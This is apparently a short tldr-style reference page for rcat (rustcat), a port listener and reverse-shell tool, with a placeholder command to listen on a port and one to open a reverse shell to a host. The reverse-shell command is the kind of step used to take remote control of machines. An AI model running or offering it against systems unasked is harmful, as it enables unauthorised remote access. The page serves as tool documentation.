# rcat

> A modern simplistic port listener & reverse shell.
> See also: `nc`.
> More information: <https://github.com/robiot/rustcat/wiki/Basic-Usage>.

- Start listening on a specific port:

`rcat listen {{port}}`

- Start a reverse shell:

`rcat connect -s {{shell}} {{host}} {{port}}`
